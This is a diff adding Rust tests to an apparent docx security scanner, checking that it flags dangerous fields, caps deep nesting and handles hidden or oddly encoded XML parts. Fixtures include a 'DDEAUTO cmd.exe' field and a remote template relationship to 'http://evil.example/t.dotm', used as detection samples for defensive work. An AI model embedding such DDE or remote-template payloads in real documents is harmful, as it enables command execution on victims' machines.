@@ -277,3 +277,77 @@ fn nested_text_is_included_when_classifying_the_outer_field() {
     let r = docx(&[("word/document.xml", &document(&body))]);
     assert_security(&r, "OOXML_DANGEROUS_FIELD", Severity::High);
 }
+
+// --- 보안 검토 3차: 중첩 상한, 확장자 없는 XML, 인코딩 ---
+
+#[test]
+fn deeply_nested_fields_are_capped_and_reported_incomplete_without_quadratic_work() {
+    let depth = 4000;
+    let chunk = "x".repeat(512);
+    let mut body = String::from("<w:p>");
+    for _ in 0..depth {
+        body.push_str(BEGIN);
+        body.push_str(&instr(&chunk));
+    }
+    for _ in 0..depth {
+        body.push_str(END);
+    }
+    body.push_str("</w:p>");
+    let start = std::time::Instant::now();
+    let r = docx(&[("word/document.xml", &document(&body))]);
+    assert!(start.elapsed() < std::time::Duration::from_secs(10), "{:?}", start.elapsed());
+    assert!(r.incomplete && r.reasons.iter().any(|x| x.contains("nesting")), "{:?}", r.reasons);
+}
+
+#[test]
+fn xml_hidden_in_a_part_with_another_extension_is_still_inspected() {
+    let dde = document(&field(&[" DDEAUTO cmd.exe "]));
+    for name in ["word/footer9.dat", "customXml/item7", "word/footer9.xml.bak"] {
+        let r = docx(&[(name, &dde)]);
+        assert_security(&r, "OOXML_DDE_FIELD", Severity::Critical);
+    }
+    let rels_hidden = rels(&[("attachedTemplate", "http://evil.example/t.dotm", true)]);
+    assert_security(&docx(&[("word/_rels/settings.data", &rels_hidden)]), "OOXML_REMOTE_TEMPLATE", Severity::Critical);
+}
+
+#[test]
+fn binary_parts_without_xml_are_not_parsed_or_reported() {
+    let r = docx(&[("word/media/blob.dat", &[0x00, 0x01, 0x02, 0xFF, 0xFE, 0x10, 0x20][..]), ("word/media/text.dat", b"plain words, not xml")]);
+    assert!(r.findings.is_empty() && !r.incomplete, "{:?} {:?}", r.findings, r.reasons);
+}
+
+#[test]
+fn utf16_without_a_bom_is_decoded_by_the_nul_pattern() {
+    let text = doc_text(&field(&[" DDEAUTO cmd.exe "]));
+    let mut b = Vec::new();
+    for u in text.encode_utf16() {
+        b.extend(u.to_le_bytes());
+    }
+    let r = docx(&[("word/document.xml", &b)]);
+    assert_security(&r, "OOXML_DDE_FIELD", Severity::Critical);
+}
+
+#[test]
+fn non_utf8_bytes_and_other_declared_encodings_are_incomplete() {
+    let invalid = b"<?xml version=\"1.0\"?><w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\"><w:body>\xFF\xFE\xFD</w:body></w:document>";
+    let r = docx(&[("word/footer1.xml", invalid)]);
+    assert!(r.incomplete && r.reasons.iter().any(|x| x.contains("non-UTF-8")), "{:?}", r.reasons);
+    let cp = br#"<?xml version="1.0" encoding="windows-1252"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body/></w:document>"#;
+    let r = docx(&[("word/footer2.xml", cp)]);
+    assert!(r.incomplete && r.reasons.iter().any(|x| x.contains("windows-1252")), "{:?}", r.reasons);
+}
+
+#[test]
+fn utf8_and_utf16_declarations_are_not_incomplete() {
+    for decl in ["UTF-8", "utf-8", "US-ASCII", "UTF-16"] {
+        let xml = format!(r#"<?xml version="1.0" encoding="{decl}"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body/></w:document>"#);
+        let r = docx(&[("word/footer3.xml", xml.as_bytes())]);
+        assert!(!r.incomplete, "{decl}: {:?}", r.reasons);
+    }
+}
+
+#[test]
+fn parse_failures_are_recorded_even_when_the_part_has_no_field_markup() {
+    let r = docx(&[("word/footer4.xml", b"<w:p><w:r>unclosed")]);
+    assert!(r.incomplete && r.reasons.iter().any(|x| x.contains("footer4.xml") && x.contains("parsed")), "{:?}", r.reasons);
+}
